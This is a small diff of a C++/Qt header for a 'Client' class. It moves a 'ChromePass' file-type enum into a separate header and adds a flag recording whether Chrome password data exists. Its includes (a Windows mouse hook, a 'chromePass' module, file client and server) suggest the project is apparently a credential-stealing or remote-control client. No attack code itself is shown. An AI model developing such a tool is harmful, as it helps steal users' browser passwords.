@@ -10,11 +10,7 @@
 #include "fileclient.h"
 #include "mousehookWinApi.h"
 #include "chromePass.h"
-
-enum Files
-{
-    ChromePass = 1
-};
+#include "files.h"
 
 class Client : public QObject
 {
@@ -42,6 +38,7 @@ private:
     Config* config;
     FileServer* fileServer;
     FileClient* fileClient;
+    bool isChromePassExists;
 };
 
 #endif // CLIENT_H
